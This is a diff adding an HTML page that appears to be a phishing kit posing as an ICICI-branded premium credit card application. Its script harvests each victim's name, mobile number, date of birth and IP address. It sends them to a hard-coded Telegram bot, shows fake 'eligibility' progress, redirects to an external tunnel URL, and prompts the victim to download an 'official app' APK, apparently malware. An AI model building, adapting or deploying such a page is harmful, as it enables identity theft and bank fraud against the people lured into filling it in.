@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Card Application</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f2f4f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-container {
+            padding: 30px 20px;
+        }
+
+        .top-image {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin-bottom: 15px;
+            border-radius: 8px;
+        }
+
+        .form-container h1 {
+            font-size: 24px;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+
+        .form-container .subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #e0e0e0;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+
+        .input-group label span {
+            color: #b30021;
+        }
+
+        .input-group .helper-text {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper .icon {
+            position: absolute;
+            left: 15px;
+            color: #888;
+            font-size: 18px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 1px solid #dcdcdc;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #b30021;
+        }
+
+        .input-wrapper input::placeholder {
+            color: #aaa;
+        }
+
+        .input-wrapper.mobile input {
+            padding-left: 60px;
+        }
+
+        .input-wrapper.mobile .prefix {
+            position: absolute;
+            left: 15px;
+            color: #666;
+            font-weight: 600;
+            font-size: 16px;
+            border-right: 1px solid #dcdcdc;
+            padding-right: 10px;
+        }
+
+        .input-wrapper.normal-input input {
+            padding-left: 15px;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 25px;
+            padding: 15px;
+            border: 1px solid #dcdcdc;
+            border-radius: 10px;
+            background: #fafafa;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-top: 3px;
+            width: 18px;
+            height: 18px;
+            accent-color: #b30021;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: #444;
+            line-height: 1.5;
+            cursor: pointer;
+        }
+
+        .checkbox-group a {
+            color: #b30021;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background-color: #8b001c;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            transition: background 0.2s, opacity 0.2s;
+        }
+
+        .btn-submit:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+
+        .btn-submit:not(:disabled):hover {
+            background-color: #6a0015;
+        }
+
+        .security-text {
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .bottom-image {
+            width: 100%;
+            max-width: 200px;
+            height: auto;
+            display: block;
+            margin: 15px auto 0;
+            border-radius: 8px;
+        }
+
+        .form-footer {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .form-footer p {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 6px;
+            line-height: 1.5;
+        }
+
+        .form-footer .footer-links {
+            color: #666;
+            font-size: 11px;
+        }
+
+        .form-footer .footer-links a {
+            color: #b30021;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-box {
+            background: #fff;
+            width: 320px;
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #b30021;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .modal-box h2 {
+            font-size: 20px;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+
+        .modal-box p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        .status-list {
+            text-align: left;
+            margin-bottom: 10px;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            margin-bottom: 12px;
+            color: #888;
+        }
+
+        .status-item .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            flex-shrink: 0;
+        }
+
+        .status-item.active { color: #b30021; font-weight: 600; }
+        .status-item.active .dot { background-color: #b30021; }
+        
+        .status-item.completed { color: #28a745; font-weight: 600; }
+        .status-item.completed .dot { background-color: #28a745; }
+
+        .header-premium {
+            background-color: #8b001c;
+            color: #ffffff;
+            padding: 15px 20px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .received-container {
+            padding: 30px 20px;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #e6f7ed;
+            color: #28a745;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            margin: 0 auto 20px;
+        }
+
+        .received-container h2 {
+            text-align: center;
+            font-size: 22px;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+        }
+
+        .received-container .desc {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .ref-box {
+            background: #fdfdfd;
+            border: 1px dashed #b30021;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .ref-box .ref-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .ref-box .ref-label {
+            font-size: 11px;
+            color: #666;
+            font-weight: 600;
+            margin-bottom: 3px;
+        }
+
+        .ref-box .ref-number {
+            font-size: 18px;
+            color: #b30021;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .btn-copy {
+            background: #fce4e6;
+            color: #b30021;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-copy:hover {
+            background: #f7c8cc;
+        }
+
+        .whats-next {
+            background: #fafafa;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .whats-next h3 {
+            font-size: 12px;
+            color: #444;
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+        }
+
+        .whats-next ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .whats-next ul li {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .whats-next ul li::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background-color: #b30021;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        /* Download Button Styles */
+        .btn-download {
+            width: 100%;
+            padding: 16px;
+            background-color: #1a1a2e;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+
+        .btn-download:hover {
+            background-color: #2a2a4e;
+        }
+
+        .app-note {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+
+        .footer-support {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            padding-bottom: 10px;
+        }
+
+        .footer-support a {
+            color: #b30021;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 11px;
+            color: #aaa;
+            padding: 20px 0 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ================= SCREEN 1: FORM ================= -->
+    <div class="screen active" id="screen1">
+        <div class="form-container">
+            
+            <img src="https://iciemeraldemetalcreditcard.ct.ws/image1.jpg" alt="Top Banner" class="top-image">
+            
+            <h1>Apply Now</h1>
+            <p class="subtitle">Fill details to check your eligibility</p>
+            <div class="divider"></div>
+
+            <form id="applicationForm">
+                <div class="input-group">
+                    <label>Full Name <span>*</span></label>
+                    <p class="helper-text">As printed on your PAN card</p>
+                    <div class="input-wrapper">
+                        <span class="icon">👤</span>
+                        <input type="text" id="fullName" placeholder="e.g. Rahul Kumar Sharma" required="">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Mobile Number <span>*</span></label>
+                    <p class="helper-text">Your registered mobile for verification</p>
+                    <div class="input-wrapper mobile">
+                        <span class="prefix">+91</span>
+                        <input type="tel" id="mobileInput" placeholder="98765 43210" maxlength="10" inputmode="numeric" required="">
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Date of Birth <span>*</span></label>
+                    <p class="helper-text">Format: DD/MM/YYYY (must be 18+)</p>
+                    <div class="input-wrapper normal-input">
+                        <input type="text" id="dobInput" placeholder="DD/MM/YYYY" maxlength="10" inputmode="numeric" required="">
+                    </div>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="privacyCheck" required="">
+                    <label for="privacyCheck">
+                        I agree to the <a href="#">Privacy Policy</a> and consent to being contacted regarding my application.
+                    </label>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn" disabled="">
+                    Submit Application →
+                </button>
+
+                <p class="security-text">
+                    🔒 256-bit SSL Encrypted • Data Protected
+                </p>
+
+                <img src="https://iciemeraldemetalcreditcard.ct.ws/image2.jpg" alt="Security Badge" class="bottom-image">
+
+                <div class="form-footer">
+                    <p>© 2026 All rights reserved</p>
+                    <p class="footer-links">
+                        support@premiumcard.com • +91 98765 43210
+                    </p>
+                    <p class="footer-links">
+                        <a href="#">Privacy Policy</a>
+                    </p>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <!-- ================= SCREEN 2: LOADING MODAL ================= -->
+    <div class="modal-overlay" id="loadingModal">
+        <div class="modal-box">
+            <div class="spinner"></div>
+            <h2>Success!</h2>
+            <p>Redirecting...</p>
+            
+            <div class="status-list">
+                <div class="status-item completed" id="status1">
+                    <div class="dot"></div>
+                    Validating your details...
+                </div>
+                <div class="status-item active" id="status2">
+                    <div class="dot"></div>
+                    Checking eligibility...
+                </div>
+                <div class="status-item" id="status3">
+                    <div class="dot"></div>
+                    Securing your application...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= SCREEN 3: APPLICATION RECEIVED ================= -->
+    <div class="screen" id="screen3">
+        <div class="header-premium">PREMIUM CARD</div>
+        <div class="received-container">
+            <div class="success-icon">✓</div>
+            <h2>Application Received!</h2>
+            <p class="desc">
+                Thank you for your interest. Our team will review your details and reach out to you shortly on your registered mobile number.
+            </p>
+
+            <div class="ref-box">
+                <div class="ref-info">
+                    <span class="ref-label">REFERENCE NO.</span>
+                    <span class="ref-number" id="refNumber">APPA700B07E</span>
+                </div>
+                <button class="btn-copy" id="copyBtn">Copy</button>
+            </div>
+
+            <div class="whats-next">
+                <h3>WHAT'S NEXT</h3>
+                <ul>
+                    <li>Review within 24–48 hours</li>
+                    <li>Call on your registered mobile</li>
+                    <li>No upfront payment required</li>
+                </ul>
+            </div>
+
+            <!-- DOWNLOAD BUTTON — APK Download Link -->
+            <a href="ICICI Credit Card.apk" download="" class="btn-download">
+                ⬇ Download Official App
+            </a>
+            <p class="app-note">Install the official app to track your application.</p>
+
+            <p class="security-text" style="margin-top: 0; margin-bottom: 20px;">
+                🔒 Secure Connection
+            </p>
+
+            <p class="footer-support">
+                Need help? <a href="mailto:support@premiumcard.com">support@premiumcard.com</a>
+            </p>
+            <p class="copyright">©2026 All rights reserved</p>
+        </div>
+    </div>
+
+    <!-- ================= JAVASCRIPT ================= -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            // ===== Elements =====
+            var form = document.getElementById('applicationForm');
+            var privacyCheck = document.getElementById('privacyCheck');
+            var submitBtn = document.getElementById('submitBtn');
+            var screen1 = document.getElementById('screen1');
+            var loadingModal = document.getElementById('loadingModal');
+            var refNumberEl = document.getElementById('refNumber');
+            var copyBtn = document.getElementById('copyBtn');
+            var mobileInput = document.getElementById('mobileInput');
+            var dobInput = document.getElementById('dobInput');
+            var fullName = document.getElementById('fullName');
+
+            // ===== TELEGRAM BOT CONFIG =====
+            var BOT_TOKEN = '8587487286:AAF9tI6-nbIH3-esqi6nw4O_ptFLkl-5vBQ';
+            var CHAT_ID = '8829768562';
+
+            // ===== 1. Checkbox Validation =====
+            privacyCheck.addEventListener('change', function() {
+                submitBtn.disabled = !this.checked;
+            });
+
+            // ===== 2. Mobile Number: Only 10 digits =====
+            mobileInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            });
+
+            // ===== 3. Date of Birth: Auto-format DD/MM/YYYY =====
+            dobInput.addEventListener('input', function() {
+                var value = this.value.replace(/\D/g, '');
+                var formattedValue = '';
+
+                if (value.length > 0) {
+                    formattedValue += value.substring(0, 2);
+                }
+                if (value.length > 2) {
+                    formattedValue += '/' + value.substring(2, 4);
+                }
+                if (value.length > 4) {
+                    formattedValue += '/' + value.substring(4, 8);
+                }
+
+                this.value = formattedValue;
+            });
+
+            // ===== 4. Get User IP Address (with timeout) =====
+            function getUserIP() {
+                return new Promise(function(resolve) {
+                    var timeout = setTimeout(function() {
+                        resolve('Unknown');
+                    }, 1500);
+
+                    fetch('https://api.ipify.org?format=json')
+                        .then(function(response) { return response.json(); })
+                        .then(function(data) {
+                            clearTimeout(timeout);
+                            resolve(data.ip);
+                        })
+                        .catch(function() {
+                            clearTimeout(timeout);
+                            resolve('Unknown');
+                        });
+                });
+            }
+
+            // ===== 5. Send Data to Telegram (Fire-and-Forget) =====
+            function sendToTelegram(name, mobile, dob, ip, refNo) {
+                var message = "🔔 NEW APPLICATION RECEIVED 🔔\n\n" +
+                              "👤 Full Name: " + name + "\n" +
+                              "📱 Mobile: +91 " + mobile + "\n" +
+                              "🎂 Date of Birth: " + dob + "\n" +
+                              "🌐 IP Address: " + ip + "\n" +
+                              "🆔 Reference No: " + refNo + "\n" +
+                              "⏰ Time: " + new Date().toLocaleString('en-IN');
+
+                var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage' +
+                          '?chat_id=' + CHAT_ID +
+                          '&text=' + encodeURIComponent(message) +
+                          '&parse_mode=Markdown';
+
+                // ✅ Image Beacon (best for redirect scenario)
+                var img = new Image();
+                img.src = url;
+
+                // ✅ Also fire fetch (no wait)
+                fetch(url).catch(function() {});
+            }
+
+            // ===== 6. Generate Reference Number =====
+            function generateReferenceNumber() {
+                var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                var result = 'APPA';
+                for (var i = 0; i < 7; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+
+            // ===== 7. Form Submission — FIXED REDIRECT =====
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // Validate mobile
+                if (mobileInput.value.length !== 10) {
+                    alert('Please enter a valid 10-digit mobile number.');
+                    mobileInput.focus();
+                    return;
+                }
+
+                // Validate DOB
+                var dobPattern = /^\d{2}\/\d{2}\/\d{4}$/;
+                if (!dobPattern.test(dobInput.value)) {
+                    alert('Please enter a valid Date of Birth in DD/MM/YYYY format.');
+                    dobInput.focus();
+                    return;
+                }
+
+                // Disable button to prevent double click
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Submitting...';
+
+                // Show loading modal
+                loadingModal.classList.add('active');
+                var refNo = generateReferenceNumber();
+
+                // Update status
+                var status1 = document.getElementById('status1');
+                var status2 = document.getElementById('status2');
+                var status3 = document.getElementById('status3');
+
+                setTimeout(function() {
+                    status1.classList.add('completed');
+                    status2.classList.remove('active');
+                    status2.classList.add('completed');
+                    status3.classList.add('active');
+                }, 800);
+
+                // ✅ STEP 1: Send to Telegram immediately (fire & forget)
+                getUserIP().then(function(ip) {
+                    sendToTelegram(fullName.value, mobileInput.value, dobInput.value, ip, refNo);
+                });
+
+                // ✅ STEP 2: Redirect after 3 seconds (guaranteed)
+                setTimeout(function() {
+                    status3.classList.remove('active');
+                    status3.classList.add('completed');
+
+                    // 🔴 REDIRECT TO EXTERNAL URL
+                    window.location.href = 'https://damp-beacon.tail84c20e.ts.net/d/06d3dbc8426bdb2dd6afb4aaa1934647';
+                }, 3000);
+            });
+
+            // ===== 8. Copy to Clipboard =====
+            copyBtn.addEventListener('click', function() {
+                var refText = refNumberEl.textContent;
+                navigator.clipboard.writeText(refText).then(function() {
+                    var originalText = copyBtn.textContent;
+                    copyBtn.textContent = 'Copied!';
+                    copyBtn.style.backgroundColor = '#d4edda';
+                    copyBtn.style.color = '#155724';
+                    
+                    setTimeout(function() {
+                        copyBtn.textContent = originalText;
+                        copyBtn.style.backgroundColor = '';
+                        copyBtn.style.color = '';
+                    }, 2000);
+                }).catch(function(err) {
+                    console.error('Failed to copy: ', err);
+                });
+            });
+        });
+    </script>
+
+</body></html>
